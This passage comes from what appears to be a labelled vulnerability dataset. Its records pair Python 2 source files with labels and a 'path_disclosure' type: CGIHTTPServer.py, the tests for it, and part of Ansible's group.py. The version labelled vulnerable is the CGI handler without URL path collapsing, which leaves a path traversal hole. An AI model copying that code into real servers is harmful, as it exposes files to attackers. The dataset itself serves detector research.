ValueError):\n                nbytes = 0\n            files = popenx(cmdline, 'b')\n            fi = files[0]\n            fo = files[1]\n            if self.have_popen3:\n                fe = files[2]\n            if self.command.lower() == \"post\" and nbytes > 0:\n                data = self.rfile.read(nbytes)\n                fi.write(data)\n            # throw away additional data [see bug #427345]\n            while select.select([self.rfile._sock], [], [], 0)[0]:\n                if not self.rfile._sock.recv(1):\n                    break\n            fi.close()\n            shutil.copyfileobj(fo, self.wfile)\n            if self.have_popen3:\n                errors = fe.read()\n                fe.close()\n                if errors:\n                    self.log_error('%s', errors)\n            sts = fo.close()\n            if sts:\n                self.log_error(\"CGI script exit status %#x\", sts)\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n        else:\n            # Other O.S. -- execute script in this process\n            save_argv = sys.argv\n            save_stdin = sys.stdin\n            save_stdout = sys.stdout\n            save_stderr = sys.stderr\n            try:\n                save_cwd = os.getcwd()\n                try:\n                    sys.argv = [scriptfile]\n                    if '=' not in decoded_query:\n                        sys.argv.append(decoded_query)\n                    sys.stdout = self.wfile\n                    sys.stdin = self.rfile\n                    execfile(scriptfile, {\"__name__\": \"__main__\"})\n                finally:\n                    sys.argv = save_argv\n                    sys.stdin = save_stdin\n                    sys.stdout = save_stdout\n                    sys.stderr = save_stderr\n                    os.chdir(save_cwd)\n            except SystemExit, sts:\n                self.log_error(\"CGI script exit status %s\", str(sts))\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n\n# TODO(gregory.p.smith): Move this into an appropriate library.\ndef _url_collapse_path_split(path):\n    \"\"\"\n    Given a URL path, remove extra '/'s and '.' path elements and collapse\n    any '..' references.\n\n    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.\n\n    Returns: A tuple of (head, tail) where tail is everything after the final /\n    and head is everything before it.  Head will always start with a '/' and,\n    if it contains anything else, never have a trailing '/'.\n\n    Raises: IndexError if too many '..' occur within the path.\n    \"\"\"\n    # Similar to os.path.split(os.path.normpath(path)) but specific to URL\n    # path semantics rather than local operating system semantics.\n    path_parts = []\n    for part in path.split('/'):\n        if part == '.':\n            path_parts.append('')\n        else:\n            path_parts.append(part)\n    # Filter out blank non trailing parts before consuming the '..'.\n    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]\n    if path_parts:\n        tail_part = path_parts.pop()\n    else:\n        tail_part = ''\n    head_parts = []\n    for part in path_parts:\n        if part == '..':\n            head_parts.pop()\n        else:\n            head_parts.append(part)\n    if tail_part and tail_part == '..':\n        head_parts.pop()\n        tail_part = ''\n    return ('/' + '/'.join(head_parts), tail_part)\n\n\nnobody = None\n\ndef nobody_uid():\n    \"\"\"Internal routine to get nobody's uid\"\"\"\n    global nobody\n    if nobody:\n        return nobody\n    try:\n        import pwd\n    except ImportError:\n        return -1\n    try:\n        nobody = pwd.getpwnam('nobody')[2]\n    except KeyError:\n        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))\n    return nobody\n\n\ndef executable(path):\n    \"\"\"Test for executable file.\"\"\"\n    try:\n        st = os.stat(path)\n    except os.error:\n        return False\n    return st.st_mode & 0111 != 0\n\n\ndef test(HandlerClass = CGIHTTPRequestHandler,\n         ServerClass = BaseHTTPServer.HTTPServer):\n    SimpleHTTPServer.test(HandlerClass, ServerClass)\n\n\nif __name__ == '__main__':\n    test()\n/n/n/nLib/test/test_httpservers.py/n/n\"\"\"Unittests for the various HTTPServer modules.\n\nWritten by Cody A.W. Somerville <cody-somerville@ubuntu.com>,\nJosip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.\n\"\"\"\n\nfrom BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer\nfrom SimpleHTTPServer import SimpleHTTPRequestHandler\nfrom CGIHTTPServer import CGIHTTPRequestHandler\nimport CGIHTTPServer\n\nimport os\nimport sys\nimport base64\nimport shutil\nimport urllib\nimport httplib\nimport tempfile\nimport threading\n\nimport unittest\nfrom test import test_support\n\n\nclass NoLogRequestHandler:\n    def log_message(self, *args):\n        # don't write log messages to stderr\n        pass\n\n\nclass TestServerThread(threading.Thread):\n    def __init__(self, test_object, request_handler):\n        threading.Thread.__init__(self)\n        self.request_handler = request_handler\n        self.test_object = test_object\n        self.test_object.lock.acquire()\n\n    def run(self):\n        self.server = HTTPServer(('', 0), self.request_handler)\n        self.test_object.PORT = self.server.socket.getsockname()[1]\n        self.test_object.lock.release()\n        try:\n            self.server.serve_forever()\n        finally:\n            self.server.server_close()\n\n    def stop(self):\n        self.server.shutdown()\n\n\nclass BaseTestCase(unittest.TestCase):\n    def setUp(self):\n        self.lock = threading.Lock()\n        self.thread = TestServerThread(self, self.request_handler)\n        self.thread.start()\n        self.lock.acquire()\n\n    def tearDown(self):\n        self.lock.release()\n        self.thread.stop()\n\n    def request(self, uri, method='GET', body=None, headers={}):\n        self.connection = httplib.HTTPConnection('localhost', self.PORT)\n        self.connection.request(method, uri, body, headers)\n        return self.connection.getresponse()\n\n\nclass BaseHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):\n        protocol_version = 'HTTP/1.1'\n        default_request_version = 'HTTP/1.1'\n\n        def do_TEST(self):\n            self.send_response(204)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'close')\n            self.end_headers()\n\n        def do_KEEP(self):\n            self.send_response(204)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'keep-alive')\n            self.end_headers()\n\n        def do_KEYERROR(self):\n            self.send_error(999)\n\n        def do_CUSTOM(self):\n            self.send_response(999)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'close')\n            self.end_headers()\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.con = httplib.HTTPConnection('localhost', self.PORT)\n        self.con.connect()\n\n    def test_command(self):\n        self.con.request('GET', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_request_line_trimming(self):\n        self.con._http_vsn_str = 'HTTP/1.1\\n'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_version_bogus(self):\n        self.con._http_vsn_str = 'FUBAR'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_digits(self):\n        self.con._http_vsn_str = 'HTTP/9.9.9'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_none_get(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_version_none(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('PUT', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_invalid(self):\n        self.con._http_vsn = 99\n        self.con._http_vsn_str = 'HTTP/9.9'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 505)\n\n    def test_send_blank(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('', '')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_header_close(self):\n        self.con.putrequest('GET', '/')\n        self.con.putheader('Connection', 'close')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_head_keep_alive(self):\n        self.con._http_vsn_str = 'HTTP/1.1'\n        self.con.putrequest('GET', '/')\n        self.con.putheader('Connection', 'keep-alive')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_handler(self):\n        self.con.request('TEST', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 204)\n\n    def test_return_header_keep_alive(self):\n        self.con.request('KEEP', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.getheader('Connection'), 'keep-alive')\n        self.con.request('TEST', '/')\n\n    def test_internal_key_error(self):\n        self.con.request('KEYERROR', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 999)\n\n    def test_return_custom_status(self):\n        self.con.request('CUSTOM', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 999)\n\n\nclass SimpleHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):\n        pass\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.cwd = os.getcwd()\n        basetempdir = tempfile.gettempdir()\n        os.chdir(basetempdir)\n        self.data = 'We are the knights who say Ni!'\n        self.tempdir = tempfile.mkdtemp(dir=basetempdir)\n        self.tempdir_name = os.path.basename(self.tempdir)\n        temp = open(os.path.join(self.tempdir, 'test'), 'wb')\n        temp.write(self.data)\n        temp.close()\n\n    def tearDown(self):\n        try:\n            os.chdir(self.cwd)\n            try:\n                shutil.rmtree(self.tempdir)\n            except:\n                pass\n        finally:\n            BaseTestCase.tearDown(self)\n\n    def check_status_and_reason(self, response, status, data=None):\n        body = response.read()\n        self.assert_(response)\n        self.assertEquals(response.status, status)\n        self.assert_(response.reason != None)\n        if data:\n            self.assertEqual(data, body)\n\n    def test_get(self):\n        #constructs the path relative to the root directory of the HTTPServer\n        response = self.request(self.tempdir_name + '/test')\n        self.check_status_and_reason(response, 200, data=self.data)\n        response = self.request(self.tempdir_name + '/')\n        self.check_status_and_reason(response, 200)\n        response = self.request(self.tempdir_name)\n        self.check_status_and_reason(response, 301)\n        response = self.request('/ThisDoesNotExist')\n        self.check_status_and_reason(response, 404)\n        response = self.request('/' + 'ThisDoesNotExist' + '/')\n        self.check_status_and_reason(response, 404)\n        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')\n        response = self.request('/' + self.tempdir_name + '/')\n        self.check_status_and_reason(response, 200)\n        if os.name == 'posix':\n            # chmod won't work as expected on Windows platforms\n            os.chmod(self.tempdir, 0)\n            response = self.request(self.tempdir_name + '/')\n            self.check_status_and_reason(response, 404)\n            os.chmod(self.tempdir, 0755)\n\n    def test_head(self):\n        response = self.request(\n            self.tempdir_name + '/test', method='HEAD')\n        self.check_status_and_reason(response, 200)\n        self.assertEqual(response.getheader('content-length'),\n                         str(len(self.data)))\n        self.assertEqual(response.getheader('content-type'),\n                         'application/octet-stream')\n\n    def test_invalid_requests(self):\n        response = self.request('/', method='FOO')\n        self.check_status_and_reason(response, 501)\n        # requests must be case sensitive,so this should fail too\n        response = self.request('/', method='get')\n        self.check_status_and_reason(response, 501)\n        response = self.request('/', method='GETs')\n        self.check_status_and_reason(response, 501)\n\n\ncgi_file1 = \"\"\"\\\n#!%s\n\nprint \"Content-type: text/html\"\nprint\nprint \"Hello World\"\n\"\"\"\n\ncgi_file2 = \"\"\"\\\n#!%s\nimport cgi\n\nprint \"Content-type: text/html\"\nprint\n\nform = cgi.FieldStorage()\nprint \"%%s, %%s, %%s\" %% (form.getfirst(\"spam\"), form.getfirst(\"eggs\"),\\\n              form.getfirst(\"bacon\"))\n\"\"\"\n\nclass CGIHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):\n        pass\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.parent_dir = tempfile.mkdtemp()\n        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')\n        os.mkdir(self.cgi_dir)\n\n        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')\n        with open(self.file1_path, 'w') as file1:\n            file1.write(cgi_file1 % sys.executable)\n        os.chmod(self.file1_path, 0777)\n\n        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')\n        with open(self.file2_path, 'w') as file2:\n            file2.write(cgi_file2 % sys.executable)\n        os.chmod(self.file2_path, 0777)\n\n        self.cwd = os.getcwd()\n        os.chdir(self.parent_dir)\n\n    def tearDown(self):\n        try:\n            os.chdir(self.cwd)\n            os.remove(self.file1_path)\n            os.remove(self.file2_path)\n            os.rmdir(self.cgi_dir)\n            os.rmdir(self.parent_dir)\n        finally:\n            BaseTestCase.tearDown(self)\n\n    def test_url_collapse_path_split(self):\n        test_vectors = {\n            '': ('/', ''),\n            '..': IndexError,\n            '/.//..': IndexError,\n            '/': ('/', ''),\n            '//': ('/', ''),\n            '/\\\\': ('/', '\\\\'),\n            '/.//': ('/', ''),\n            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),\n            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),\n            'a': ('/', 'a'),\n            '/a': ('/', 'a'),\n            '//a': ('/', 'a'),\n            './a': ('/', 'a'),\n            './C:/': ('/C:', ''),\n            '/a/b': ('/a', 'b'),\n            '/a/b/': ('/a/b', ''),\n            '/a/b/c/..': ('/a/b', ''),\n            '/a/b/c/../d': ('/a/b', 'd'),\n            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),\n            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),\n            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),\n            '../a/b/c/../d/e/.././././..//f': IndexError,\n            '/a/b/c/../d/e/../../../f': ('/a', 'f'),\n            '/a/b/c/../d/e/../../../../f': ('/', 'f'),\n            '/a/b/c/../d/e/../../../../../f': IndexError,\n            '/a/b/c/../d/e/../../../../f/..': ('/', ''),\n        }\n        for path, expected in test_vectors.iteritems():\n            if isinstance(expected, type) and issubclass(expected, Exception):\n                self.assertRaises(expected,\n                                  CGIHTTPServer._url_collapse_path_split, path)\n            else:\n                actual = CGIHTTPServer._url_collapse_path_split(path)\n                self.assertEquals(expected, actual,\n                                  msg='path = %r\\nGot:    %r\\nWanted: %r' % (\n                                  path, actual, expected))\n\n    def test_headers_and_content(self):\n        res = self.request('/cgi-bin/file1.py')\n        self.assertEquals(('Hello World\\n', 'text/html', 200), \\\n             (res.read(), res.getheader('Content-type'), res.status))\n\n    def test_post(self):\n        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})\n        headers = {'Content-type' : 'application/x-www-form-urlencoded'}\n        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)\n\n        self.assertEquals(res.read(), '1, python, 123456\\n')\n\n    def test_invaliduri(self):\n        res = self.request('/cgi-bin/invalid')\n        res.read()\n        self.assertEquals(res.status, 404)\n\n    def test_authorization(self):\n        headers = {'Authorization' : 'Basic %s' % \\\n                base64.b64encode('username:pass')}\n        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)\n        self.assertEquals(('Hello World\\n', 'text/html', 200), \\\n             (res.read(), res.getheader('Content-type'), res.status))\n\n    def test_no_leading_slash(self):\n        # http://bugs.python.org/issue2254\n        res = self.request('cgi-bin/file1.py')\n        self.assertEquals(('Hello World\\n', 'text/html', 200),\n             (res.read(), res.getheader('Content-type'), res.status))\n\n\ndef test_main(verbose=None):\n    try:\n        cwd = os.getcwd()\n        test_support.run_unittest(BaseHTTPServerTestCase,\n                                  SimpleHTTPServerTestCase,\n                                  CGIHTTPServerTestCase\n                                  )\n    finally:\n        os.chdir(cwd)\n\nif __name__ == '__main__':\n    test_main()\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "923ba361d8f757f0656cfd216525aca4848e02aa", "code": "/Lib/CGIHTTPServer.py/n/n\"\"\"CGI-savvy HTTP Server.\n\nThis module builds on SimpleHTTPServer by implementing GET and POST\nrequests to cgi-bin scripts.\n\nIf the os.fork() function is not present (e.g. on Windows),\nos.popen2() is used as a fallback, with slightly altered semantics; if\nthat function is not present either (e.g. on Macintosh), only Python\nscripts are supported, and they are executed by the current process.\n\nIn all cases, the implementation is intentionally naive -- all\nrequests are executed sychronously.\n\nSECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL\n-- it may execute arbitrary Python code or external programs.\n\nNote that status code 200 is sent prior to execution of a CGI script, so\nscripts cannot send other status codes such as 302 (redirect).\n\"\"\"\n\n\n__version__ = \"0.4\"\n\n__all__ = [\"CGIHTTPRequestHandler\"]\n\nimport os\nimport sys\nimport urllib\nimport BaseHTTPServer\nimport SimpleHTTPServer\nimport select\n\n\nclass CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n\n    \"\"\"Complete HTTP server with GET, HEAD and POST commands.\n\n    GET and HEAD also support running CGI scripts.\n\n    The POST command is *only* implemented for CGI scripts.\n\n    \"\"\"\n\n    # Determine platform specifics\n    have_fork = hasattr(os, 'fork')\n    have_popen2 = hasattr(os, 'popen2')\n    have_popen3 = hasattr(os, 'popen3')\n\n    # Make rfile unbuffered -- we need to read one line and then pass\n    # the rest to a subprocess, so we can't use buffered input.\n    rbufsize = 0\n\n    def do_POST(self):\n        \"\"\"Serve a POST request.\n\n        This is only implemented for CGI scripts.\n\n        \"\"\"\n\n        if self.is_cgi():\n            self.run_cgi()\n        else:\n            self.send_error(501, \"Can only POST to CGI scripts\")\n\n    def send_head(self):\n        \"\"\"Version of send_head that support CGI scripts\"\"\"\n        if self.is_cgi():\n            return self.run_cgi()\n        else:\n            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)\n\n    def is_cgi(self):\n        \"\"\"Test whether self.path corresponds to a CGI script,\n        and return a boolean.\n\n        This function sets self.cgi_info to a tuple (dir, rest)\n        when it returns True, where dir is the directory part before\n        the CGI script name.  Note that rest begins with a\n        slash if it is not empty.\n\n        The default implementation tests whether the path\n        begins with one of the strings in the list\n        self.cgi_directories (and the next character is a '/'\n        or the end of the string).\n        \"\"\"\n\n        path = self.path\n\n        for x in self.cgi_directories:\n            i = len(x)\n            if path[:i] == x and (not path[i:] or path[i] == '/'):\n                self.cgi_info = path[:i], path[i+1:]\n                return True\n        return False\n\n    cgi_directories = ['/cgi-bin', '/htbin']\n\n    def is_executable(self, path):\n        \"\"\"Test whether argument path is an executable file.\"\"\"\n        return executable(path)\n\n    def is_python(self, path):\n        \"\"\"Test whether argument path is a Python script.\"\"\"\n        head, tail = os.path.splitext(path)\n        return tail.lower() in (\".py\", \".pyw\")\n\n    def run_cgi(self):\n        \"\"\"Execute a CGI script.\"\"\"\n        path = self.path\n        dir, rest = self.cgi_info\n\n        i = path.find('/', len(dir) + 1)\n        while i >= 0:\n            nextdir = path[:i]\n            nextrest = path[i+1:]\n\n            scriptdir = self.translate_path(nextdir)\n            if os.path.isdir(scriptdir):\n                dir, rest = nextdir, nextrest\n                i = path.find('/', len(dir) + 1)\n            else:\n                break\n\n        # find an explicit query string, if present.\n        i = rest.rfind('?')\n        if i >= 0:\n            rest, query = rest[:i], rest[i+1:]\n        else:\n            query = ''\n\n        # dissect the part after the directory name into a script name &\n        # a possible additional path, to be stored in PATH_INFO.\n        i = rest.find('/')\n        if i >= 0:\n            script, rest = rest[:i], rest[i:]\n        else:\n            script, rest = rest, ''\n\n        scriptname = dir + '/' + script\n        scriptfile = self.translate_path(scriptname)\n        if not os.path.exists(scriptfile):\n            self.send_error(404, \"No such CGI script (%r)\" % scriptname)\n            return\n        if not os.path.isfile(scriptfile):\n            self.send_error(403, \"CGI script is not a plain file (%r)\" %\n                            scriptname)\n            return\n        ispy = self.is_python(scriptname)\n        if not ispy:\n            if not (self.have_fork or self.have_popen2 or self.have_popen3):\n                self.send_error(403, \"CGI script is not a Python script (%r)\" %\n                                scriptname)\n                return\n            if not self.is_executable(scriptfile):\n                self.send_error(403, \"CGI script is not executable (%r)\" %\n                                scriptname)\n                return\n\n        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html\n        # XXX Much of the following could be prepared ahead of time!\n        env = {}\n        env['SERVER_SOFTWARE'] = self.version_string()\n        env['SERVER_NAME'] = self.server.server_name\n        env['GATEWAY_INTERFACE'] = 'CGI/1.1'\n        env['SERVER_PROTOCOL'] = self.protocol_version\n        env['SERVER_PORT'] = str(self.server.server_port)\n        env['REQUEST_METHOD'] = self.command\n        uqrest = urllib.unquote(rest)\n        env['PATH_INFO'] = uqrest\n        env['PATH_TRANSLATED'] = self.translate_path(uqrest)\n        env['SCRIPT_NAME'] = scriptname\n        if query:\n            env['QUERY_STRING'] = query\n        host = self.address_string()\n        if host != self.client_address[0]:\n            env['REMOTE_HOST'] = host\n        env['REMOTE_ADDR'] = self.client_address[0]\n        authorization = self.headers.getheader(\"authorization\")\n        if authorization:\n            authorization = authorization.split()\n            if len(authorization) == 2:\n                import base64, binascii\n                env['AUTH_TYPE'] = authorization[0]\n                if authorization[0].lower() == \"basic\":\n                    try:\n                        authorization = base64.decodestring(authorization[1])\n                    except binascii.Error:\n                        pass\n                    else:\n                        authorization = authorization.split(':')\n                        if len(authorization) == 2:\n                            env['REMOTE_USER'] = authorization[0]\n        # XXX REMOTE_IDENT\n        if self.headers.typeheader is None:\n            env['CONTENT_TYPE'] = self.headers.type\n        else:\n            env['CONTENT_TYPE'] = self.headers.typeheader\n        length = self.headers.getheader('content-length')\n        if length:\n            env['CONTENT_LENGTH'] = length\n        referer = self.headers.getheader('referer')\n        if referer:\n            env['HTTP_REFERER'] = referer\n        accept = []\n        for line in self.headers.getallmatchingheaders('accept'):\n            if line[:1] in \"\\t\\n\\r \":\n                accept.append(line.strip())\n            else:\n                accept = accept + line[7:].split(',')\n        env['HTTP_ACCEPT'] = ','.join(accept)\n        ua = self.headers.getheader('user-agent')\n        if ua:\n            env['HTTP_USER_AGENT'] = ua\n        co = filter(None, self.headers.getheaders('cookie'))\n        if co:\n            env['HTTP_COOKIE'] = ', '.join(co)\n        # XXX Other HTTP_* headers\n        # Since we're setting the env in the parent, provide empty\n        # values to override previously set values\n        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',\n                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):\n            env.setdefault(k, \"\")\n        os.environ.update(env)\n\n        self.send_response(200, \"Script output follows\")\n\n        decoded_query = query.replace('+', ' ')\n\n        if self.have_fork:\n            # Unix -- fork as we should\n            args = [script]\n            if '=' not in decoded_query:\n                args.append(decoded_query)\n            nobody = nobody_uid()\n            self.wfile.flush() # Always flush before forking\n            pid = os.fork()\n            if pid != 0:\n                # Parent\n                pid, sts = os.waitpid(pid, 0)\n                # throw away additional data [see bug #427345]\n                while select.select([self.rfile], [], [], 0)[0]:\n                    if not self.rfile.read(1):\n                        break\n                if sts:\n                    self.log_error(\"CGI script exit status %#x\", sts)\n                return\n            # Child\n            try:\n                try:\n                    os.setuid(nobody)\n                except os.error:\n                    pass\n                os.dup2(self.rfile.fileno(), 0)\n                os.dup2(self.wfile.fileno(), 1)\n                os.execve(scriptfile, args, os.environ)\n            except:\n                self.server.handle_error(self.request, self.client_address)\n                os._exit(127)\n\n        elif self.have_popen2 or self.have_popen3:\n            # Windows -- use popen2 or popen3 to create a subprocess\n            import shutil\n            if self.have_popen3:\n                popenx = os.popen3\n            else:\n                popenx = os.popen2\n            cmdline = scriptfile\n            if self.is_python(scriptfile):\n                interp = sys.executable\n                if interp.lower().endswith(\"w.exe\"):\n                    # On Windows, use python.exe, not pythonw.exe\n                    interp = interp[:-5] + interp[-4:]\n                cmdline = \"%s -u %s\" % (interp, cmdline)\n            if '=' not in query and '\"' not in query:\n                cmdline = '%s \"%s\"' % (cmdline, query)\n            self.log_message(\"command: %s\", cmdline)\n            try:\n                nbytes = int(length)\n            except (TypeError, ValueError):\n                nbytes = 0\n            files = popenx(cmdline, 'b')\n            fi = files[0]\n            fo = files[1]\n            if self.have_popen3:\n                fe = files[2]\n            if self.command.lower() == \"post\" and nbytes > 0:\n                data = self.rfile.read(nbytes)\n                fi.write(data)\n            # throw away additional data [see bug #427345]\n            while select.select([self.rfile._sock], [], [], 0)[0]:\n                if not self.rfile._sock.recv(1):\n                    break\n            fi.close()\n            shutil.copyfileobj(fo, self.wfile)\n            if self.have_popen3:\n                errors = fe.read()\n                fe.close()\n                if errors:\n                    self.log_error('%s', errors)\n            sts = fo.close()\n            if sts:\n                self.log_error(\"CGI script exit status %#x\", sts)\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n        else:\n            # Other O.S. -- execute script in this process\n            save_argv = sys.argv\n            save_stdin = sys.stdin\n            save_stdout = sys.stdout\n            save_stderr = sys.stderr\n            try:\n                save_cwd = os.getcwd()\n                try:\n                    sys.argv = [scriptfile]\n                    if '=' not in decoded_query:\n                        sys.argv.append(decoded_query)\n                    sys.stdout = self.wfile\n                    sys.stdin = self.rfile\n                    execfile(scriptfile, {\"__name__\": \"__main__\"})\n                finally:\n                    sys.argv = save_argv\n                    sys.stdin = save_stdin\n                    sys.stdout = save_stdout\n                    sys.stderr = save_stderr\n                    os.chdir(save_cwd)\n            except SystemExit, sts:\n                self.log_error(\"CGI script exit status %s\", str(sts))\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n\nnobody = None\n\ndef nobody_uid():\n    \"\"\"Internal routine to get nobody's uid\"\"\"\n    global nobody\n    if nobody:\n        return nobody\n    try:\n        import pwd\n    except ImportError:\n        return -1\n    try:\n        nobody = pwd.getpwnam('nobody')[2]\n    except KeyError:\n        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))\n    return nobody\n\n\ndef executable(path):\n    \"\"\"Test for executable file.\"\"\"\n    try:\n        st = os.stat(path)\n    except os.error:\n        return False\n    return st.st_mode & 0111 != 0\n\n\ndef test(HandlerClass = CGIHTTPRequestHandler,\n         ServerClass = BaseHTTPServer.HTTPServer):\n    SimpleHTTPServer.test(HandlerClass, ServerClass)\n\n\nif __name__ == '__main__':\n    test()\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "153c9bd539eeffdd6d395b8840f95d56e3814f27", "code": "lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.errors import AnsibleError\n\nfrom itertools import chain\n\n\nclass Group:\n    ''' a group of ansible hosts '''\n\n    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]\n\n    def __init__(self, name=None):\n\n        self.depth = 0\n        self.name = name\n        self.hosts = []\n        self._hosts = None\n        self.vars = {}\n        self.child_groups = []\n        self.parent_groups = []\n        self._hosts_cache = None\n        self.priority = 1\n\n    def __repr__(self):\n        return self.get_name()\n\n    def __str__(self):\n        return self.get_name()\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def serialize(self):\n        parent_groups = []\n        for parent in self.parent_groups:\n            parent_groups.append(parent.serialize())\n\n        self._hosts = None\n\n        result = dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            parent_groups=parent_groups,\n            depth=self.depth,\n            hosts=self.hosts,\n        )\n\n        return result\n\n    def deserialize(self, data):\n        self.__init__()\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.depth = data.get('depth', 0)\n        self.hosts = data.get('hosts', [])\n        self._hosts = None\n\n        parent_groups = data.get('parent_groups', [])\n        for parent_data in parent_groups:\n            g = Group()\n            g.deserialize(parent_data)\n            self.parent_groups.append(g)\n\n    def _walk_relationship(self, rel):\n        '''\n        Given `rel` that is an iterable property of Group,\n        consitituting a directed acyclic graph among all groups,\n        Returns a set of all groups in full tree\n        A   B    C\n        |  / |  /\n        | /  | /\n        D -> E\n        |  /    vertical connections\n        | /     are directed upward\n        F\n        Called on F, returns set of (A, B, C, D, E)\n        '''\n        seen = set([])\n        unprocessed = set(getattr(self, rel))\n\n        while unprocessed:\n            seen.update(unprocessed)\n            unprocessed = set(chain.from_iterable(\n                getattr(g, rel) for g in unprocessed\n            ))\n            unprocessed.difference_update(seen)\n\n        return seen\n\n    def get_ancestors(self):\n        return self._walk_relationship('parent_groups')\n\n    def get_descendants(self):\n        return self._walk_relationship('child_groups')\n\n    @property\n    def host_names(self):\n        if self._hosts is None:\n            self._hosts = set(self.hosts)\n        return self._hosts\n\n    def get_name(self):\n        return self.name\n\n    def add_child_group(self, group):\n\n        if self == group:\n            raise Exception(\"can't add group to itself\")\n\n        # don't add if it's already there\n        if group not in self.child_groups:\n\n            # prepare list of group's new ancestors this edge creates\n            start_ancestors = group.get_ancestors()\n            new_ancestors = self.get_ancestors()\n            if group in new_ancestors:\n                raise AnsibleError(\n                    \"Adding group '%s' as child to '%s' creates a recursive \"\n                    \"dependency loop.\" % (group.name, self.name))\n            new_ancestors.add(self)\n            new_ancestors.difference_update(start_ancestors)\n\n            self.child_groups.append(group)\n\n            # update the depth of the child\n            group.depth = max([self.depth + 1, group.depth])\n\n            # update the depth of the grandchildren\n            group._check_children_depth()\n\n            # now add self to child's parent_groups list, but only if there\n            # isn't already a group with the same name\n            if self.name not in [g.name for g in group.parent_groups]:\n                group.parent_groups.append(self)\n                for h in group.get_hosts():\n                    h.populate_ancestors(additions=new_ancestors)\n\n            self.clear_hosts_cache()\n\n    def _check_children_depth(self):\n\n        depth = self.depth\n        start_depth = self.depth  # self.depth could change over loop\n        seen = set([])\n        unprocessed = set(self.child_groups)\n\n        while unprocessed:\n            seen.update(unprocessed)\n            depth += 1\n            to_process = unprocessed.copy()\n            unprocessed = set([])\n            for g in to_process:\n                if g.depth < 